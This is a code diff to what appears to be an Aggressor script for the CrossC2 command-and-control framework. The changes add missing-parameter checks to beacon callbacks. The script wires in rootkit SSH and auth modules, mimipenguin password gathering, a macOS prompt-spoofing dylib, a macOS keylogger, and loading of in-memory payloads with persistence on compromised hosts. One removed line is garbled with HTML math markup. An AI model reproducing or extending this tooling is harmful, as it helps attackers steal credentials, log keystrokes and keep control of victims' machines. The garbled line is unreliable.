@@ -9,7 +9,6 @@ include(script_resource("script/python-import.cna"));
 include(script_resource("proxy/frp/cc2_frp.cna"));
 include(script_resource("rootkit/auth/cc2_ssh.cna"));
 include(script_resource("rootkit/auth/cc2_auth.cna"));
-#include(script_resource("scanner/ServerScan/serverscan.cna"));
 include(script_resource("gather/password/mimipenguin/cc2_mimipenguin.cna"));
 include(script_resource("gather/prompt/osx/cc2_prompt_spoof_dylib.cna"));
 include(script_resource("gather/keylogger/osx/keylogger_osx2.cna"));
@@ -46,6 +45,10 @@ sub openMemoryFileLoadDialogCallBack {
     local('$taskFile $fileAliasName $taskType $taskResType $taskNeedRun $taskNeedPersistence $taskXorKey $transportArg');
     ($taskFile, $fileAliasName, $taskType, $taskResType, $taskNeedRun, $taskNeedPersistence, $taskXorKey) = values($3, @('taskFile', 'fileAliasName', 'taskType', 'taskResType', 'taskNeedRun', 'taskNeedPersistence', 'taskXorKey'));
     $transportArg = "";
+    if (!$taskFile || !$fileAliasName || !$taskType || !$taskResType || !$taskNeedRun || !$taskNeedPersistence || !$taskXorKey) {
+        berror($beaconid, "Error: Missing required parameters.");
+        return;
+    }
     bcrossc2_load_dyn_pro($beaconid, $taskType, $fileAliasName, $taskResType, $taskNeedRun, $taskNeedPersistence, $taskXorKey, $taskFile, $transportArg);
 }
 
@@ -53,9 +56,13 @@ sub openMemoryFileLoadDialogCallBack {
 sub openPythonImportDialogDialogCallBack {
     local('$pythonFile $taskResType $scriptType $scriptEnginePath $scriptLocalPath $transportArg $pathIndex $filename $importName');
     $pythonFile = $3['pythonFile'];
+    if (!$pythonFile) {
+        berror($beaconid, "Error: Missing required parameters.");
+        return;
+    }
     binput($beaconid, $pythonFile);
     $taskResType = "info";
-    <span class="math-inline">scriptType \= 'python\-import</span>';
+    $scriptType = 'python-import$';
     $scriptEnginePath = 'null';
     $scriptLocalPath = $pythonFile;
     $transportArg = '';
@@ -78,6 +85,10 @@ sub openPythonImportDialogDialogCallBack {
 sub openRunMemoryFileDialogCallBack {
     local('$fileAliasName $processName $taskArgs $taskType $shell');
     ($fileAliasName, $processName, $taskArgs, $taskType) = values($3, @('fileAliasName', 'processName', 'taskArgs', 'taskType'));
+    if (!$fileAliasName || !$taskType) {
+        berror($beaconid, "Error: Missing required parameters.");
+        return;
+    }
     $taskType = runType($taskType);
     $shell = $taskType eq "0" ? "cc2-run $fileAliasName $processName $taskArgs" : "cc2-run $fileAliasName $taskArgs";
     binput($beaconid, "shell $shell");
